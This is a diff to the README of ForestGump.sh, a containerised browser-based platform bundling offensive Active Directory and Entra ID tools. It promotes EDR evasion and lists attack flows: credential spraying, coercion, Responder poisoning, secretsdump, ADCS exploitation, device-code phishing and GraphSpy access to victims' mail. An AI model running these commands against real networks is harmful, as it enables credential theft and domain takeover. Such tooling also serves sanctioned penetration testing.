@@ -7,134 +7,279 @@
 </p>
 
 <p align="center">
-    <em>AD Attack Platform</em> · browser-based · containerized · ready to roll
+    <strong>The AD & Entra ID Attack Platform That Runs in Your Browser</strong>
 </p>
 
-> Mama always said: "AD pentesting tools are like a box of chocolates — you never know what you're gonna get."  
-> But with ForestGump.sh, you get all of them. In a browser. In a container. Like a paper bag around booze at the grocery store.
+<p align="center">
+    <code>containerized</code> · <code>browser-based</code> · <code>EDR-invisible</code> · <code>ready to roll</code>
+</p>
 
-Look, here's the thing: when an EDR like CrowdStrike or SentinelOne is sitting on the target, running impacket from your laptop is like chugging whiskey in the checkout aisle: you're gonna get caught. But wrap it in a container? That's the paper bag. The EDR sees ttyd, a friendly little web terminal. It doesn't see the Responder, the secretsdump, the ntlmrelayx hiding inside. You just look like a guy buying groceries.
+<p align="center">
+    <a href="#quick-start"><img src="https://img.shields.io/badge/-Quick_Start-black?style=for-the-badge" alt="Quick Start" /></a>
+    <a href="#arsenal"><img src="https://img.shields.io/badge/-Arsenal-black?style=for-the-badge" alt="Arsenal" /></a>
+    <a href="#rdp--vnc-in-the-browser"><img src="https://img.shields.io/badge/-RDP_in_Browser-black?style=for-the-badge" alt="RDP in Browser" /></a>
+    <a href="#kubernetes-deployment"><img src="https://img.shields.io/badge/-K8s_Deploy-black?style=for-the-badge" alt="Kubernetes" /></a>
+</p>
 
-A single Docker image packing the sharpest Active Directory and Entra ID attack & enumeration tools, served through **ttyd** — a web-based terminal on port `7681`. Fire up a browser, and you're in. Run from anywhere. Leave no agent on disk. And if you mess up? Just like that, it's like stepping off a bus — you don't even look back.
+---
+
+> *"Mama always said: AD pentesting tools are like a box of chocolates — you never know what you're gonna get."*
+>
+> But with ForestGump.sh, you get **all of them**. In a browser. In a container.
+
+---
+
+## The Paper Bag Theory
+
+When an EDR like CrowdStrike or SentinelOne is sitting on the target, running impacket from your laptop is like chugging whiskey in the checkout aisle — you're gonna get caught.
+
+But wrap it in a container? **That's the paper bag.**
+
+The EDR sees ttyd, a friendly little web terminal. It doesn't see the Responder, the secretsdump, the ntlmrelayx hiding inside. You just look like a guy buying groceries.
+
+**Single Docker image. 50+ offensive tools. Zero disk footprint.** Fire up a browser and you're in. Run from anywhere. Leave no agent on disk. And if you mess up? Just like that, it's like stepping off a bus — you don't even look back.
+
+---
 
 ## Demo
-
-ForestGump.sh gives you a browser-accessible offensive AD/Entra workstation with preinstalled tooling, so you can start assessing targets immediately instead of spending time on setup.
 
 <p align="center">
     <img src="static/browser_tty.png" alt="ForestGump.sh browser terminal demo" width="980" />
 </p>
 
-In the web terminal you can:
+<table>
+<tr>
+<td width="33%"><strong>Instant Access</strong><br/>Launch AD & Entra recon tools the second the container starts</td>
+<td width="33%"><strong>Disposable</strong><br/>Ephemeral container — kill it and every trace vanishes</td>
+<td width="33%"><strong>Portable</strong><br/>Works from any machine with a browser at <code>localhost:7681</code></td>
+</tr>
+</table>
 
-- launch AD and Entra recon tools right away
-- run from a disposable, reproducible container environment
-- work from any machine with just a browser at `http://localhost:7681`
-
-## Tools
-
-### On-Prem AD
-
-| Tool | Description |
-|------|-------------|
-| [bloodyAD](https://github.com/CravateRouge/bloodyAD) | AD privilege escalation swiss army knife (LDAP/SAMR) |
-| [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) | BloodHound Python ingestor |
-| [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) | Network execution toolkit (smb, ldap, winrm, etc.) |
-| [Impacket](https://github.com/fortra/impacket) | Swiss army knife of AD protocols |
-| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/MDNS poisoner |
-| [RelayKing-Depth](https://github.com/depthsecurity/RelayKing-Depth) | NTLM & Kerberos relay detection |
-| [Coercer](https://github.com/p0dalirius/Coercer) | Automatic Windows auth coercion |
-| [certipy-ad](https://github.com/ly4k/Certipy) | ADCS abuse toolkit |
-| [gopacket](https://github.com/mandiant/gopacket) | Go impacket — 63 tools, 24 packages (Mandiant) |
-| [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) | LDAP domain dumper |
-| [pySIDHistory](https://github.com/felixbillieres/pySIDHistory) | Remote SID History injection & auditing |
-| [getSPNless](https://github.com/jarnovandenbrink/getSPNless) | SPN-less RBCD attacks |
-| [ad-reaper](https://github.com/mermehr/ad-reaper) | Multi-protocol AD enumerator (LDAP, SMB, SAMR) |
-| [AdStrike](https://github.com/capture0x/AdStrike) | AI-powered modular AD red-team framework |
-| [godap](https://github.com/Macmod/godap) | LDAP TUI explorer |
-| [ldapnomnom](https://github.com/lkarlslund/ldapnomnom) | Anonymous LDAP username bruteforce |
-| [GPOHunter](https://github.com/PShlyundin/GPOHunter) | GPO misconfiguration analyzer |
-| [gpoParser](https://github.com/synacktiv/gpoParser) | GPO extraction & analysis |
-| [snafflepy](https://github.com/cisagov/snafflepy) | Python Snaffler — interesting file discovery |
-| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | WinRM shell (Ruby) |
-| [xfreerdp](https://github.com/FreeRDP/FreeRDP) | RDP client (headless-safe via xvfb) |
-| [rdp-browser](/#rdp--vnc-in-the-browser) | Browser-accessible RDP via noVNC (port 6080) |
-| [tmux](https://github.com/tmux/tmux) | Terminal multiplexer for session management |
-| [tightvncserver](https://github.com/TigerVNC/tigervnc) | VNC server |
-| [noVNC](https://github.com/novnc/noVNC) | Browser-based VNC client (port 6080) |
-| [gontlm-proxy](https://github.com/bdwyertech/gontlm-proxy) | NTLM proxy forwarder |
-| [px](https://github.com/genotrance/px) | NTLM proxy (Python) |
-| [DonPAPI](https://github.com/login-securite/DonPAPI) | Remote DPAPI credential dumper |
-| [mimikatz](https://github.com/gentilkiwi/mimikatz) | Windows credential extraction (binary in /opt/tools/mimikatz) |
-| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos abuse toolkit (source in /opt/tools/Rubeus) |
-| [KslKatz](https://github.com/vergamota/KslKatz) | BYOVD LSASS credential extractor (source in /opt/tools/KslKatz) |
-| [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | PowerUp, PowerView, etc. (source in /opt/tools/PowerSploit) |
-| [SharpUp](https://github.com/GhostPack/SharpUp) | C# PowerUp (source in /opt/tools/SharpUp) |
-| [Recon-AD](https://github.com/outflanknl/Recon-AD) | ADSI-based AD recon DLLs (source in /opt/tools/Recon-AD) |
-| [ADCSCoercePotato](https://github.com/decoder-it/ADCSCoercePotato) | ADCS auth coercion (source in /opt/tools/ADCSCoercePotato) |
-| [adPEAS](https://github.com/61106960/adPEAS) | AD enum PowerShell script (/opt/tools/adPEAS) |
-| [AD-Ghost](https://github.com/LuemmelSec/AD-Ghost) | AD "undetectable" account PoC (/opt/tools/AD-Ghost) |
-| [Invoke-PassTheCert](https://github.com/The-Viper-One/Invoke-PassTheCert) | Cert-based LDAP auth PowerShell (/opt/tools/Invoke-PassTheCert) |
-
-### Entra ID / Azure AD
-
-| Tool | Description |
-|------|-------------|
-| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure AD exploration framework (roadrecon, roadlib) |
-| [roadtx](https://github.com/dirkjanm/ROADtools) | ROADtools Token eXchange |
-| [EntraFalcon](https://github.com/CompassSecurity/EntraFalcon) | Entra ID enumeration & risk assessment (PowerShell) |
-| [entra-ca-insight](https://github.com/emiliensocchi/entra-ca-insight) | Conditional Access gap analysis |
-| [Azure CLI](https://github.com/Azure/azure-cli) | Azure CLI (pipx) |
-| [TokenSmith](https://github.com/JumpsecLabs/TokenSmith) | Entra ID token generator |
-| [Microsoft.Graph](https://github.com/microsoftgraph/msgraph-sdk-powershell) | Microsoft Graph PowerShell SDK |
-| [AzureAD](https://github.com/Azure/AzureAD) | AzureAD PowerShell module |
+---
 
 ## Quick Start
 
 ```bash
-# Build the image
-make build
-
-# Run with host networking (recommended for AD work)
-make run
+# One command to rule them all
+make build && make run
 ```
 
-Open **http://localhost:7681** in your browser.
+Then open **http://localhost:7681** in your browser. That's it. You're in.
 
-### With bridge networking
-
-```bash
-make run-bridge
-```
-
-### Interactive shell
+<details>
+<summary><strong>Other run modes</strong></summary>
 
 ```bash
+# Bridge networking (Docker Desktop on Windows/Mac)
+make run-windows
+
+# Host networking (native Linux — all ports, raw sockets)
+make run-linux
+
+# Use the prebuilt GHCR image (no build required)
+make ghcr          # Docker Desktop
+make ghcr-linux    # Native Linux
+
+# Interactive shell (bypass ttyd, go straight to bash)
 make shell
 ```
 
-## Usage Examples
+</details>
+
+<details>
+<summary><strong>GHCR one-liner (no clone needed)</strong></summary>
 
 ```bash
-# BloodHound enumeration
+docker run -it --rm --name forestgump \
+  -p 7681:7681 -p 6080:6080 -p 5000:5000 \
+  --cap-add=NET_ADMIN --cap-add=SYS_ADMIN \
+  ghcr.io/benjitrapp/forestgump.sh:latest
+```
+
+For Mac Silicon (ARM):
+```bash
+docker pull ghcr.io/benjitrapp/forestgump.sh:latest --platform linux/x86_64
+```
+
+</details>
+
+---
+
+## Arsenal
+
+> 50+ tools. Everything you need from initial recon to full domain compromise to cloud takeover.
+
+### On-Prem Active Directory
+
+<details open>
+<summary><strong>Reconnaissance & Enumeration</strong></summary>
+
+| Tool | What it does |
+|:-----|:-------------|
+| [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) | BloodHound Python ingestor — map attack paths |
+| [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) | Network execution toolkit (SMB, LDAP, WinRM, MSSQL) |
+| [godap](https://github.com/Macmod/godap) | LDAP TUI explorer — browse AD like a filesystem |
+| [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) | Dump the entire domain via LDAP |
+| [ldapnomnom](https://github.com/lkarlslund/ldapnomnom) | Anonymous LDAP username bruteforce |
+| [ad-reaper](https://github.com/mermehr/ad-reaper) | Multi-protocol AD enumerator (LDAP, SMB, SAMR) |
+| [AdStrike](https://github.com/capture0x/AdStrike) | AI-powered modular AD red-team framework |
+| [GPOHunter](https://github.com/PShlyundin/GPOHunter) | GPO misconfiguration analyzer |
+| [gpoParser](https://github.com/synacktiv/gpoParser) | GPO extraction & analysis |
+| [snafflepy](https://github.com/cisagov/snafflepy) | Python Snaffler — sniff out interesting files on shares |
+| [snitch](https://github.com/karol-broda/snitch) | AD recon & enumeration |
+
+</details>
+
+<details open>
+<summary><strong>Authentication Attacks & Relay</strong></summary>
+
+| Tool | What it does |
+|:-----|:-------------|
+| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/MDNS poisoner — harvest creds off the wire |
+| [Impacket](https://github.com/fortra/impacket) | Swiss army knife of AD protocols (secretsdump, getTGT, ntlmrelayx, ...) |
+| [RelayKing-Depth](https://github.com/depthsecurity/RelayKing-Depth) | NTLM & Kerberos relay detection |
+| [Coercer](https://github.com/p0dalirius/Coercer) | Automatic Windows auth coercion |
+| [gopacket](https://github.com/mandiant/gopacket) | Go Impacket — 63 tools, 24 packages (Mandiant) |
+| [gontlm-proxy](https://github.com/bdwyertech/gontlm-proxy) | NTLM proxy forwarder |
+| [px](https://github.com/genotrance/px) | NTLM proxy (Python) |
+
+</details>
+
+<details open>
+<summary><strong>Privilege Escalation & Exploitation</strong></summary>
+
+| Tool | What it does |
+|:-----|:-------------|
+| [bloodyAD](https://github.com/CravateRouge/bloodyAD) | AD privilege escalation swiss army knife (LDAP/SAMR) |
+| [certipy-ad](https://github.com/ly4k/Certipy) | ADCS abuse toolkit — ESC1 through ESC13 |
+| [pySIDHistory](https://github.com/felixbillieres/pySIDHistory) | Remote SID History injection & auditing |
+| [getSPNless](https://github.com/jarnovandenbrink/getSPNless) | SPN-less RBCD attacks |
+| [DonPAPI](https://github.com/login-securite/DonPAPI) | Remote DPAPI credential dumper |
+| [mimikatz](https://github.com/gentilkiwi/mimikatz) | Windows credential extraction |
+| [Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos abuse toolkit |
+| [ADCSCoercePotato](https://github.com/decoder-it/ADCSCoercePotato) | ADCS auth coercion |
+
+</details>
+
+<details>
+<summary><strong>Windows Binaries & PowerShell (transfer to target)</strong></summary>
+
+| Tool | Path |
+|:-----|:-----|
+| [mimikatz](https://github.com/gentilkiwi/mimikatz) | `/opt/tools/mimikatz/` |
+| [Rubeus](https://github.com/GhostPack/Rubeus) | `/opt/tools/Rubeus/` |
+| [KslKatz](https://github.com/vergamota/KslKatz) | `/opt/tools/KslKatz/` |
+| [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | `/opt/tools/PowerSploit/` |
+| [SharpUp](https://github.com/GhostPack/SharpUp) | `/opt/tools/SharpUp/` |
+| [Recon-AD](https://github.com/outflanknl/Recon-AD) | `/opt/tools/Recon-AD/` |
+| [ADCSCoercePotato](https://github.com/decoder-it/ADCSCoercePotato) | `/opt/tools/ADCSCoercePotato/` |
+| [adPEAS](https://github.com/61106960/adPEAS) | `/opt/tools/adPEAS/` |
+| [AD-Ghost](https://github.com/LuemmelSec/AD-Ghost) | `/opt/tools/AD-Ghost/` |
+| [Invoke-PassTheCert](https://github.com/The-Viper-One/Invoke-PassTheCert) | `/opt/tools/Invoke-PassTheCert/` |
+
+</details>
+
+---
+
+### Entra ID / Azure / M365
+
+> From initial access to full cloud takeover — device codes, token abuse, email access, MFA bypass.
+
+| Tool | What it does |
+|:-----|:-------------|
+| [GraphSpy](https://github.com/RedByte1337/GraphSpy) | **Entra ID & M365 post-exploitation browser GUI** — tokens, device codes, PRT, MFA, Outlook, Teams, OneDrive (port 5000) |
+| [CredSpy](https://github.com/RedByte1337/CredSpy) | Entra ID user enumeration & auth method discovery via GetCredentialType API |
+| [o365creeper](https://github.com/RedByte1337/o365creeper) | O365 email address validation without login attempts |
+| [TokenTactics](https://github.com/rvrsh3ll/TokenTactics) | Azure JWT token manipulation — device code phishing, token switching (PowerShell) |
+| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure AD exploration framework (roadrecon + roadtx) |
+| [EntraFalcon](https://github.com/CompassSecurity/EntraFalcon) | Entra ID enumeration & risk assessment (PowerShell) |
+| [entra-ca-insight](https://github.com/emiliensocchi/entra-ca-insight) | Conditional Access gap analysis |
+| [TokenSmith](https://github.com/JumpsecLabs/TokenSmith) | Entra ID token generator (Go) |
+| [AzureRedOps](https://github.com/Mr-Un1k0d3r/AzureRedOps) | Azure/Entra ID red team PowerShell toolkit |
+| [GraphRobber](https://github.com/rabbit-sec/GraphRobber) | Microsoft Graph API permission abuse |
+| [Microsoft.Graph](https://github.com/microsoftgraph/msgraph-sdk-powershell) | Microsoft Graph PowerShell SDK |
+| [AzureAD](https://github.com/Azure/AzureAD) | AzureAD PowerShell module |
+
+---
+
+### Shells & Remote Access
+
+| Tool | What it does |
+|:-----|:-------------|
+| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | WinRM shell (Ruby) |
+| [xfreerdp](https://github.com/FreeRDP/FreeRDP) | RDP client (headless-safe via xvfb) |
+| [rdp-browser](#rdp--vnc-in-the-browser) | Browser-accessible RDP via noVNC (port 6080) |
+| [tmux](https://github.com/tmux/tmux) | Terminal multiplexer |
+| [tightvncserver](https://github.com/TigerVNC/tigervnc) | VNC server |
+| [noVNC](https://github.com/novnc/noVNC) | Browser-based VNC client (port 6080) |
+| [pwsh](https://github.com/PowerShell/PowerShell) | PowerShell 7 |
+
+---
+
+## Usage Examples
+
+<details open>
+<summary><strong>On-Prem AD Attack Flow</strong></summary>
+
+```bash
+# Enumerate the domain
 bloodhound-python -d domain.local -u user -p Password123 -dc dc.domain.local -c all
 
-# NetExec
+# Spray credentials across the network
 nxc smb 192.168.1.0/24 -u user -p Password123
 
-# Coercer
+# Coerce authentication
 coercer coerce -d domain.local -u user -p Password123 --dc-ip 192.168.1.10 -l attacker-ip
 
-# Responder
+# Poison the network
 responder -I eth0 -wrf
 
-# RelayKing
-python3 /opt/tools/RelayKing-Depth/relayking.py -h
+# Dump secrets
+impacket-secretsdump domain.local/user:Password123@192.168.1.10
 
-# gopacket (63 Go tools in /opt/tools/gopacket)
-./GetADUsers host
-./rbcd ...
+# ADCS exploitation
+certipy-ad find -u user@domain.local -p Password123 -dc-ip 192.168.1.10
 ```
+
+</details>
+
+<details open>
+<summary><strong>Entra ID / Cloud Attack Flow</strong></summary>
+
+```bash
+# Validate O365 email addresses (no login attempts)
+o365creeper -f emails.txt -o valid.txt
+
+# Enumerate auth methods for valid users
+credspy valid.txt --csv results.csv
+
+# Launch GraphSpy browser GUI for post-exploitation
+graphspy
+# Open http://localhost:5000 — manage tokens, device codes, read emails, Teams, OneDrive
+
+# Azure JWT token manipulation (PowerShell)
+pwsh -c "Import-Module /opt/tools/TokenTactics/TokenTactics.psd1; Get-AzureToken -Client MSGraph"
+
+# ROADtools exploration
+roadrecon auth -u user@target.com -p Password123
+roadrecon gather
+roadrecon gui
+```
+
+</details>
+
+---
+
+## Ports & Services
+
+| Port | Service | Access | Purpose |
+|:----:|:--------|:-------|:--------|
+| `7681` | ttyd | **http://localhost:7681** | Web terminal (primary interface) |
+| `5000` | GraphSpy | **http://localhost:5000** | Entra ID/M365 post-exploitation GUI |
+| `6080` | noVNC | **http://localhost:6080/vnc.html** | Browser-accessible RDP desktop |
+| `5900` | x11vnc | internal | VNC (container only) |
+
+---
 
 ## RDP & VNC in the Browser
 
@@ -142,20 +287,18 @@ ForestGump.sh gives you two ways to work with RDP sessions — both work inside 
 
 ### xfreerdp (headless-safe)
 
-The `xfreerdp` command is wrapped by `xvfb-run` when no display is available, so it won't crash with the typical `$DISPLAY` error:
+The `xfreerdp` command is wrapped by `xvfb-run` when no display is available:
 
 ```bash
 xfreerdp /v:192.168.1.100 /u:administrator /p:Password123 /cert:ignore
 ```
 
-This runs the RDP client against a virtual framebuffer — useful for commands that don't need visual interaction. You won't see a desktop, but the RDP session still establishes.
-
 ### Browser-accessible RDP via noVNC
 
-For full visual RDP access, use `rdp-browser`. It launches a pipeline that renders the RDP desktop in your browser:
+For full visual RDP access, use `rdp-browser`:
 
 ```
-Xvfb → xfreerdp → x11vnc → websockify/noVNC
+Xvfb --> xfreerdp --> x11vnc --> websockify/noVNC --> your browser
 ```
 
 ```bash
@@ -164,22 +307,18 @@ rdp-browser /v:192.168.1.100 /u:administrator /p:Password123 /cert:ignore
 
 Open **http://localhost:6080/vnc.html** in a second browser tab.
 
-The RDP session runs in the foreground of your ttyd terminal. Press **Ctrl+C** to stop and clean up all processes (Xvfb, x11vnc, websockify, xfreerdp).
-
 ### Background session management
-
-Running `rdp-browser` blocks the terminal. For longer sessions, use the background helpers:
 
 ```bash
 rdp-bg /v:192.168.1.100 /u:admin /p:Password123 /cert:ignore
 # Terminal is free — session runs in background
-# Open http://localhost:6080/vnc.html
 
 rdp-ls          # List active sessions
 rdp-stop 1234   # Kill session by PID
 ```
 
-Environment variables for `rdp-browser` / `rdp-bg`:
+<details>
+<summary><strong>Environment variables</strong></summary>
 
 | Variable      | Default        | Description                          |
 |---------------|----------------|--------------------------------------|
@@ -188,41 +327,29 @@ Environment variables for `rdp-browser` / `rdp-bg`:
 | `DISPLAY_NUM` | `99`           | Virtual X display number             |
 | `SCREEN_SIZE` | `1280x1024x24` | Virtual screen resolution & depth    |
 
-### Ports
+</details>
 
-| Port | Service    | Purpose                          |
-|------|------------|----------------------------------|
-| 7681 | ttyd       | Web terminal (primary interface) |
-| 6080 | noVNC      | Browser-accessible RDP desktop   |
-| 5900 | x11vnc     | Internal VNC (container only)    |
+---
 
-> **Note for bridge networking**: port 6080 is automatically mapped. For host networking (`--net=host`), the port is directly accessible on the host.
+## xfreerdp Demo Environment
 
-### xfreerdp Demo Environment
-
-A self-contained demo environment is included to validate headless RDP connectivity end-to-end using Docker Compose.
+A self-contained demo environment validates headless RDP connectivity end-to-end:
 
 <p align="center">
     <img src="assets/rdp-terminal-demo.gif" alt="Headless xfreerdp session connecting to an xrdp target from Docker" width="980" />
 </p>
 
-**Architecture:**
-
-```
-┌─────────────────────┐         RDP (3389)        ┌─────────────────────┐
-│   forestgump        │ ──────────────────────────>│   rdp-target        │
-│                     │                            │                     │
-│  - xfreerdp 2.11.5 │                            │  - Ubuntu 24.04     │
-│  - xvfb (headless)  │                            │  - xrdp             │
-│  - ttyd (web shell) │                            │  - openbox (WM)     │
-│                     │                            │  - xterm            │
-│  Port: 7681 (ttyd)  │                            │  Port: 3389 (RDP)   │
-└─────────────────────┘                            └─────────────────────┘
-         │                          │
-         └──────── adlab network ───┘
+```mermaid
+graph LR
+    subgraph adlab network
+        A[<strong>forestgump</strong><br/>xfreerdp 2.11.5<br/>xvfb headless<br/>ttyd web shell<br/><em>Port: 7681</em>]
+        B[<strong>rdp-target</strong><br/>Ubuntu 24.04<br/>xrdp<br/>openbox WM<br/><em>Port: 3389</em>]
+    end
+    A -- "RDP (3389)" --> B
 ```
 
-**Start the demo:**
+<details>
+<summary><strong>Run the demo</strong></summary>
 
 ```bash
 # Build and launch both containers
@@ -231,14 +358,12 @@ docker compose -f docker-compose.demo.yml up -d --build
 # Wait for xrdp to initialize
 sleep 3
 
-# Run the validation (connects to the rdp-target container)
+# Run the validation
 docker exec forestgump bash /opt/scripts/demo-xfreerdp.sh rdp-target demo demo
 
 # Dry-run (no target, validates toolchain only)
 docker exec forestgump bash /opt/scripts/demo-xfreerdp.sh
 ```
-
-The demo script runs four checks:
 
 | Check | What it proves |
 |-------|---------------|
@@ -247,58 +372,47 @@ The demo script runs four checks:
 | xvfb-run available | Headless X11 virtual framebuffer is present |
 | Live RDP connection | End-to-end RDP from forestgump to rdp-target works |
 
-**Connect to your own targets from inside the container:**
-
-```bash
-# Using the wrapper (auto-detects headless):
-xfreerdp /v:192.168.1.10 /u:administrator /p:'P@ssw0rd' /cert:ignore
-
-# Or validate with the demo script:
-bash /opt/scripts/demo-xfreerdp.sh 192.168.1.10 administrator 'P@ssw0rd'
-```
-
 **Demo credentials:** `demo` / `demo`
 
 **Cleanup:**
-
 ```bash
 docker compose -f docker-compose.demo.yml down
 ```
 
-**Troubleshooting:**
+</details>
+
+<details>
+<summary><strong>Troubleshooting</strong></summary>
 
 - **xrdp not listening** — wait a few seconds after container start; xrdp-sesman needs time to initialize.
-- **"Xvfb failed to start"** — a stale lock file may exist. The `--auto-servernum` flag avoids this by picking an unused display number. If it persists, restart the container.
+- **"Xvfb failed to start"** — a stale lock file may exist. The `--auto-servernum` flag avoids this. If it persists, restart the container.
 - **Connection refused** — ensure both containers are on the same network (`docker network ls` should show `forestgumpsh_adlab`).
 
-## Running with Network Access
+</details>
 
-The container uses `--net=host` to share the host network stack — necessary for tools like Responder, Coercer, and nxc that need raw socket access or must listen on specific ports.
+---
 
-`--cap-add=NET_ADMIN` and `--cap-add=SYS_ADMIN` grant the privileges needed for packet crafting and network manipulation.
+## Network & Capabilities
 
-Use the prebuilt GHCR image with host networking:
+The container optionally uses `--net=host` to share the host network stack — necessary for tools like Responder, Coercer, and nxc that need raw socket access.
 
-```bash
-docker run -it --rm --name forestgump -p 7681:7681 --net=host --cap-add=NET_ADMIN --cap-add=SYS_ADMIN ghcr.io/benjitrapp/forestgump.sh:latest
-```
+| Capability | Why |
+|:-----------|:----|
+| `NET_ADMIN` | Packet crafting, network manipulation |
+| `SYS_ADMIN` | Raw sockets (Responder, relay tools) |
 
-For Mac Silicon (ARM) users, pull the x86_64 image explicitly before running:
-
-```bash
-docker pull ghcr.io/benjitrapp/forestgump.sh:latest --platform linux/x86_64
-```
+---
 
 ## Kubernetes Deployment
-
-For fast deployment, run the following command:
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/benjitrapp/forestgump.sh/main/deploy/forestgump.yaml
 ```
 
-### Pod
+<details>
+<summary><strong>Manual manifests</strong></summary>
 
+**Pod:**
 ```yaml
 apiVersion: v1
 kind: Pod
@@ -312,12 +426,12 @@ spec:
     image: ghcr.io/benjitrapp/forestgump.sh:latest
     ports:
     - containerPort: 7681
+    - containerPort: 5000
     securityContext:
       readOnlyRootFilesystem: true
 ```
 
-### Service
-
+**Service:**
 ```yaml
 apiVersion: v1
 kind: Service
@@ -330,38 +444,54 @@ spec:
   ports:
   - port: 7681
     protocol: TCP
+    name: ttyd
+  - port: 5000
+    protocol: TCP
+    name: graphspy
   selector:
     app: forestgump
 ```
 
-To access the container, run:
-
+**Access:**
 ```bash
-kubectl port-forward forestgump-pod 7681:7681
+kubectl port-forward forestgump-pod 7681:7681 5000:5000
 ```
 
-Open in your browser: **http://localhost:7681**
+Open **http://localhost:7681** (terminal) and **http://localhost:5000** (GraphSpy).
+
+</details>
+
+---
 
 ## Project Structure
 
 ```
 ForestGump.sh/
-├── Dockerfile
-├── Makefile
-├── README.md
-├── docker-compose.demo.yml  # Demo environment (forestgump + rdp-target)
-├── install.sh               # Tool installation script
-├── assets/
-│   └── rdp-terminal-demo.gif
+├── Dockerfile                   # Single-stage build, ttyd base image
+├── Makefile                     # build / run / ghcr / shell targets
+├── install.sh                   # Tool installation (runs during docker build)
+├── docker-compose.demo.yml      # Demo: forestgump + rdp-target
+│
+├── scripts/
+│   ├── entrypoint.sh            # Container startup + tool banner
+│   ├── shell.sh                 # Shell launcher (sources tools.sh)
+│   ├── tools.sh                 # PATH, aliases, help() function
+│   ├── bashrc_custom            # rdp-bg, rdp-stop, rdp-ls helpers
+│   ├── xfreerdp.sh             # Headless-safe xfreerdp wrapper
+│   ├── rdp-browser.sh          # noVNC RDP pipeline
+│   ├── demo-xfreerdp.sh        # Validation script (4 checks)
+│   └── demo-record-terminal.sh # GIF recording helper
+│
 ├── deploy/
-│   └── rdp-target/          # RDP target image (ubuntu + xrdp + openbox)
-└── scripts/
-    ├── bashrc_custom        # Shell rc file with RDP session helpers
-    ├── demo-xfreerdp.sh     # Demo validation script (4 checks)
-    ├── demo-record-terminal.sh
-    ├── entrypoint.sh        # ttyd launcher with tool banner
-    ├── rdp-browser.sh       # Browser-accessible RDP via noVNC
-    ├── shell.sh             # Shell launcher
-    ├── tools.sh             # PATH/alias setup (sourced in .bashrc)
-    └── xfreerdp.sh          # Headless-safe xfreerdp wrapper
+│   ├── forestgump.yaml          # Kubernetes manifest
+│   └── rdp-target/Dockerfile    # Demo RDP target (Ubuntu + xrdp)
+│
+├── static/                      # Logo, GIFs, screenshots
+└── assets/                      # Demo recordings
 ```
+
+---
+
+<p align="center">
+    <em>"I may not be a smart man, but I know what domain admin is."</em>
+</p>
